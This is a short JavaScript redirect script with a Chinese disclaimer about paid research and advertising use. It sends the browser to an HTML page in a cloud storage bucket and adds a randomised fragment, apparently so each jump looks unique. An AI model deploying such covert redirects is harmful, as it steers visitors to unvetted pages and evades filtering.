// 免责声明：本平台所有接口仅限制用于有偿技术研究讨论与正规广告信息推广使用，请勿用于非法用途，否则产生一切后果由用户自行承担!
// 禁止一切违法违纪的擦边的网址,图片等 如：(博彩,色情,彩票,不属实内容等违法国家相关法律内容)，否则本平台有权删除相关内容！

var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/ba1764b0f34945faaf006599f858a123.html#{nnnnnnn}{wwww}',];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
